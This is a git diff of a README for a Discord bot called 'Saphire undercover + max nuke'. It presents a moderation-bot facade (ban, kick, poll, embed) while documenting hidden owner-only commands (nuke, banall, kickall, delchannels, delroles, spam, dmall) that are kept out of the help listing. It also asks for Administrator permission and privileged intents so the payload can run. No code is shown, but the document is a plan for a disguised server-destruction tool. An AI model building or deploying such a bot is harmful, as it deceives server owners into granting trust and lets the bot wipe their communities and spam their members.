@@ -1,28 +1,22 @@
-# Saphire (undercover)
+# Saphire undercover + max nuke
 
-Public face = multi-purpose / moderation bot (Sapphire-style).
-Owner-only payload = full nuke.
-
-## Railway vars
+## Railway
 
 ```
-TOKEN=...
-OWNER_IDS=ton_id
+TOKEN=
+OWNER_IDS=
 PREFIX=s!
-WHITELIST_GUILDS=
 ```
 
-## Public (anyone with perms)
+## Public facade
 
-`s!help` `s!ping` `s!serverinfo` `s!userinfo` `s!avatar`  
-`s!ban` `s!kick` `s!mute` `s!warn` `s!purge` `s!say` `s!embed`
+help ping botinfo serverinfo userinfo avatar roleinfo channelinfo  
+ban softban unban kick mute unmute warn purge lock unlock slowmode  
+nick role massban say embed poll invite
 
-## Owner only (hidden from help)
+## Owner (hidden)
 
-`s!nuke` `s!banall` `s!kickall` `s!delchannels` `s!delroles`  
-`s!spam` `s!whitelist` `s!guilds` `s!leave` `s!ownerhelp`
+nuke banall kickall delchannels delroles delemojis  
+spam dmall rename whitelist guilds leave ownerhelp
 
-## Invite
-
-bot + applications.commands · Administrator recommended for payload  
-Intents: Server Members + Message Content ON
+Invite: Administrator · Intents Members + Message Content
